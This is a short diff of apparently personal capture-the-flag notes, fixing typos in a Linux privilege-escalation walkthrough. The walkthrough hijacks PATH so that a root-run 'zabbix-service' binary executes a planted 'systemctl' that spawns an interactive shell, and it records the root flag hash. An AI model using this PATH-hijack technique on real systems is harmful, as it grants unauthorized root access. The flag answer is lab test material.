@@ -1653,10 +1653,10 @@ running strings zabbix-service
 we see its running systemctl as root so we can do that
 to remove unwanted symbolic links   :   find -name l -delete
 so first:
-1) exporth PATH=.
+1) export PATH=.
 2) /bin/echo '/bin/sh -i' >> systemctl
 3) /bin/chmod +x systemctl
-4) ./zabbix-service ... start
+4) ./zabbix-service start
 5) read the root flag  >>>>>>>>>>>>>>>>>>>>>  a7c743d35b8efbedfd9336492a8eab6e
  
 *****************************************
